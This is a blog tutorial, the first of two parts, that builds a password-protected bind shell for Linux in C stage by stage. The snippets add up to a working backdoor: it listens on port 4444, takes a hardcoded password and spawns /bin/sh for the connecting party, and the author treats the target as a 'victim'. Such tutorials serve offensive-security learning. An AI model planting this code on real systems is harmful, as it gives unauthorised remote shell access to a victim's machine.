---
title: "Implementing a password protected bind shell in shellcode - Part 1"
categories:
  - Assembly
---

The goal of the following blog post is to write shellcode for the Linux 64-bit architecture that will ultimately spawn a bind shell and require a password for connecting to it.

<h4>To accomplish this goal, we will break this process up into 3 parts:</h4>

<ol>
    <li>Firstly, we need to write the code, in the C Programming Language, for creating a socket and password protecting it.</li>
    <li>Secondly, the C code needs to be ported to x86_64 Assembly code.</li>
    <li>Lastly, all Null bytes need to be removed from the Assembly code and we need to look for opportunities to optimize our shellcode to keep the final payload as small as possible.</li>
</ol>

<h4>This blog post will consist of two parts:</h4>

<ul>
    <li>Part 1 - Writing a password protected bind shell in the C Programming Language</li>
    <li>Part 2 - Porting the C code to Linux 64-bit Assembly code and optimizing the code for use as shellcode</li>
</ul>

<h2>PART 1 - Writing a password protected bind shell for Linux in C</h2>
 
In this section, I will take you through a step-by-step process of coding a bind shell and will try my best to clarify it as best I can. Before we begin with this process though, let's make sure everybody knows what we are ultimately trying achieve.

<h3>What is a Bind Shell?</h3>

A Bind Shell is created when a socket is created on the host and is then bound to a specific port. A Bash shell is then bound to this specific socket. This means that anybody connecting to the listener will be presented with a bash shell upon successful connection. The security implication here is that anybody can connect to the running listener, so if we can password protect the bind shells that we spawn then we can prevent arbitrary connections to it and provides us with more control.

<h3>Creating the Bind Shell</h3>

In the process of creating a bind shell, we will be stepping through 7 stages:

<ol>
<li>Creating a new socket</li>
<li>Binding the newly created socket to a port</li>
<li>Listen for incoming connections on the newly created socket</li>
<li>Wait for incoming connections on the newly created socket</li>
<li>Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities.</li>
<li>Wait for input (password) to be received and compare it against the correct password string</li>
<li>Spawn the shell, if password is correct</li>
</ol>


So let's get started in coding out the 7 stages.

<h3><b>Stage 1 - Creating a new socket</b></h3>

The skeleton code that we will be departing on this journey from can be seen below. This is essentially just declaring some variables, to be used later, as well as importing the necessary libraries we will be using in the code.

```c++
#include<stdlib.h>
#include<string.h>
#include<strings.h>
#include<unistd.h>
#include<arpa/inet.h>

int main()
{
        struct sockaddr_in server;
        struct sockaddr_in client;
        int sock;
        int new_sock;
        int sockaddr_len = sizeof(struct sockaddr_in);
        // Change arguments as required - last argument is password
        char *arguments[] = { "/bin/sh", 0, "4444", "YOLOOOOOOO" };
        char buf[16];
}
```

Creating the socket is handled by the socket syscall. Syscall stands for System Call and is used to make requests from the user space into the Linux Kernel. The importance and intricacies of syscalls when it comes to shellcode/Assembly Language will be explained in Part 2 of this blog. 

Referring to the man page for [socket](https://man7.org/linux/man-pages/man2/socket.2.html), it requires 3 arguments:

<ul>
    <li>Protocol Family - We will be using AF_INET (IPv4 Internet Protocols)</li>
    <li>Communication Type - We will use SOCK_STREAM (TCP)</li>
    <li>The third argument does not concern us so we will only pass 0</li>
</ul>

```c++
sock = socket(AF_INET, SOCK_STREAM, 0);
```

The return value for the above syscall will be a file descriptor for the new socket.

<h3><strong>Stage 2 - Binding the newly created socket to a port</strong></h3>

In this step we will assign an address to the newly created socket. We will use the [bind](https://man7.org/linux/man-pages/man2/bind.2.html) syscall for this. The bind syscall again takes 3 arguments:

<ul>
    <li>The socket to bind to - We will use our new socket "sock"</li>
    <li>Data structure of the server/victim, which is essentially the IP Address and port that the bind syscall needs to use. This data structure consists of 4 members that are each explained below.</li>
    <li>Length of the data structure passed in argument 2. This was declared during the skeleton code stage.</li>
</ul>

```c++
server.sin_family = AF_INET; //Address Family
server.sin_port = htons(atoi(arguments[2])); //Network Byte order of the port to bind to. 
                                             //htons converts host byte order to network byte order
server.sin_addr.s_addr = INADDR_ANY; //Netowrk interfaces to bind to, INADDR_ANY = All interfaces
bzero(&server.sin_zero, 8); // 8 zero bytes of padding

bind(sock, (struct sockaddr *)&server, sockaddr_len);
```

<h3>Stage 3 - Listen for incoming connections on the newly created socket</h3>

The [listen](https://man7.org/linux/man-pages/man2/listen.2.html) syscall accepts 2 arguments:

<ul>
<li>File descriptor of new socket in Stage 1</li>
<li>Backlog - Maximum number of pending connections in the queue</li>
</ul>

```c++
listen(sock, 2);
```

<h3>Stage 4 - Wait for incoming connections on the newly created socket</h3>

For this stage we will wait for connections on our newly created socket, using the [accept](https://man7.org/linux/man-pages/man2/accept.2.html) syscall, and as soon as a connection is initiated, we will create new socket with the network information of the incoming connection and store it in a new variable. After the new socket is created, we will tear down or close the original socket.

The accept syscall takes 3 arguments:

<ul>
<li>The socket we are listening on</li>
<li>Pointer to a sockaddr data structure - as discussed in stage 2. the difference with this step is that the accept syscall will populate the 4 members of the data structure for us based on the incoming connection. </li>
<li>Pointer to the size of the sockaddr structure in point above. This was already declared in the variables at the start of the code.</li>
</ul>

```c++
new_sock = accept(sock, (struct sockaddr *)&client, &sockaddr_len);
close(sock);
```

The return value of the accept syscall is a new file descriptor pointing to the newly created socket.

<h3>Stage 5 - Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities</h3>

For this stage we will be duplicating the file descriptor of our newly created socket and provide it with the basic shell capabilities and we will be using the [dup2](https://man7.org/linux/man-pages/man2/dup.2.html) syscall for this purpose. We need to provide the file descriptor of our newly created socket and the integer assigned to STDIN (0), STDOUT (1) and STDERROR(2) to dup2.

```c++
dup2(new_sock, 0);
dup2(new_sock, 1);
dup2(new_sock, 2);
```

<h3>Stage 6 - Wait for input (password) to be received and compare it against the correct password string</h3>

Now that we have remote shell capabilities on our socket, lets wait for input (password) from the connection and compare it to the password that we have in memory. We will wait for and read input with the [read](https://man7.org/linux/man-pages/man2/read.2.html) syscall.

The read syscall accept 3 arguments:

<ul>
<li>File descriptor of our newly created socket</li>
<li>Buffer - was assigned at the variables section of the code</li>
<li>Number of bytes to read from the file descriptor into the buffer</li>
</ul>

We will then use the strcspn syscall to calculate the number of bytes in the buffer and and using strcmp syscall to compare the string in the buffer with our hardcoded password in memory. If the two strings match, the strcmp syscall will return a 0, and our program will continue. If the two strings don't match, our program/shell will exit.

```c++
read(new_sock, buf, 16);
buf[strcspn(buf, "\n")] = 0;
if (strcmp(arguments[3], buf) == 0)
{
        execve(arguments[0], &arguments[0], NULL);
}
```

<h3>Stage 7 - Spawn the shell, if password is correct</h3>

So, if we have provided the correct password our program/shell will continue and actually spawn our shell, using the [execve](https://man7.org/linux/man-pages/man2/execve.2.html) syscall, as specified in the variables section.

The execve syscall executes a program using:

<ul>
<li>Pathname of the executable or script to run</li>
<li>A pointer to the filename/executable and arguments passed to the executable. We do not have any arguments in this case, so just the pointer to our executable</li>
<li>Environmental variables for use by the program - We set this to NULL as we are not concerned with this</li>
</ul>

```c++
execve(arguments[0], &arguments[0], NULL);
```

Hopefully, if we have done everything right, we will be presented with our remote shell capabilities on the victim. Personally, I prefer the fact that there is no prompt for a password as it adds an element of obscurity for somebody connecting to the shell without spawning it themselves.

The code for the password protected bind shell can be found [here](https://github.com/J33R4FF3/Pass_Bind_Shell).

I hope I explained everything in enough detail for it to make a bit more sense to you as this is also an attempt at understanding the inner workings of bind and reverse shells better myself.

In [PART 2](https://j33r4ff3.github.io/blog/Creating-TCP-Bind-Shell-with-C_2/) we will be discussing how to port all of the above to Linux x86_64 Assembly code so that we can use the shellcode when the situation presents itself. 
